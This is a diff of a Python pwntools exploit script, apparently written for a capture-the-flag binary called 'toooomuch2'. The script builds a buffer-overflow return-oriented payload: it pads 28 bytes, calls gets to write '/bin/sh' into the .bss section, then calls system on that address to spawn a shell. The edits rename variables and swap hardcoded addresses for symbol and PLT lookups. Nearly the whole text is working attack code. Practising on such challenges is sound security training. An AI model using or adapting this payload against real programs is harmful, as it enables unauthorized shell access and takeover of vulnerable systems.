@@ -12,10 +12,10 @@ def debug(addr = '0x080487D7'):
 shellcode="/bin/sh\0"
 
 elf = ELF('/home/h11p/hackme/toooomuch2')
-exec_system=elf.symbols['system']
+exec_system=elf.plt['system']
 print "%x" % exec_system
-scanf_addr = elf.symbols['gets']
-print "%x" % scanf_addr
+gets_addr = elf.symbols['gets']
+print "%x" % gets_addr
 bss_addr = elf.bss()
 print "%x" % bss_addr
 offset = 28
@@ -27,12 +27,11 @@ pop_ret=0x0804889b  #pop_ret
 system_addr= 0x08048649
 
 payload = 'A' * offset
-payload += p32(scanf_addr)
+payload += p32(gets_addr)
 payload +=p32(pop_ret)
 payload += p32(bss_addr)
 
-payload += p32(0x08048649)
-#payload += p32(scanf_fmt_addr)
+payload += p32(system_addr)
 payload += p32(bss_addr)
 payload += p32(0)
 
